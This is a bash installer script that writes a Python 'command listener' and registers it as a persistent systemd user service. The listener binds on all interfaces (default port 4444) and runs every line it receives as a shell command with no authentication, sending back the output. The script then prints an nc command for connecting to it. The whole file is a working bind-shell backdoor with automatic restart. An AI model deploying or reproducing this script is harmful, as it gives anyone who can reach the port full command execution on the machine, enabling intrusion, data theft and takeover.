#!/bin/bash

echo "🚀 Setting up persistent command listener service"
echo "⚠️  Running it twice will override everything"
echo ""

# Get port from user
read -p "📡 Choose a port number (default 4444): " PORT
PORT=${PORT:-4444}

# Validate port
if ! [[ "$PORT" =~ ^[0-9]+$ ]] || [ "$PORT" -lt 1024 ] || [ "$PORT" -gt 65535 ]; then
    echo "❌ Invalid port. Using 4444"
    PORT=4444
fi

echo "✅ Using port: $PORT"

# Create script directory
SCRIPT_DIR="$HOME/.local/bin"
mkdir -p "$SCRIPT_DIR"

# Create the Python script
SCRIPT_PATH="$SCRIPT_DIR/cmd-listener.py"
cat > "$SCRIPT_PATH" << 'EOFPYTHON'
import socket
import subprocess
import sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4444

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', PORT))
s.listen(1)
print(f"Server running on port {PORT}...")

while True:
    conn, addr = s.accept()
    print(f"Connected: {addr}")
    
    while True:
        try:
            data = conn.recv(1024).decode().strip()
            if not data:
                break
            
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
                                   stderr=subprocess.PIPE, text=True)
            output, errors = proc.communicate()
            result = output + errors
            
            conn.send((result + '\n').encode())
        except Exception as e:
            try:
                conn.send(f"Error: {str(e)}\n".encode())
            except:
                pass
            break
    
    conn.close()
    print("Client disconnected, waiting for next connection...")
EOFPYTHON

chmod +x "$SCRIPT_PATH"
echo "✅ Script created at: $SCRIPT_PATH"

# Create systemd service file
SERVICE_NAME="cmd-listener"
SERVICE_FILE="$HOME/.config/systemd/user/${SERVICE_NAME}.service"
mkdir -p "$HOME/.config/systemd/user"

cat > "$SERVICE_FILE" << EOFSERVICE
[Unit]
Description=Command Listener Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 $SCRIPT_PATH $PORT
Restart=always
RestartSec=3

[Install]
WantedBy=default.target
EOFSERVICE

echo "✅ Service file created at: $SERVICE_FILE"

# Reload systemd and enable service
systemctl --user daemon-reload
systemctl --user enable "$SERVICE_NAME"
systemctl --user restart "$SERVICE_NAME"

# Check status
sleep 1
if systemctl --user is-active --quiet "$SERVICE_NAME"; then
    echo ""
    echo "🎉 Service is running!"
    echo ""
    echo "📋 Useful commands:"
    echo "  Status:  systemctl --user status $SERVICE_NAME"
    echo "  Stop:    systemctl --user stop $SERVICE_NAME"
    echo "  Start:   systemctl --user start $SERVICE_NAME"
    echo "  Restart: systemctl --user restart $SERVICE_NAME"
    echo "  Logs:    journalctl --user -u $SERVICE_NAME -f"
    echo ""
    echo "📱 Connect using:"
    echo "  nc $(hostname -I | awk '{print $1}') $PORT"
else
    echo ""
    echo "❌ Service failed to start. Check logs:"
    echo "  journalctl --user -u $SERVICE_NAME -n 50"
fi
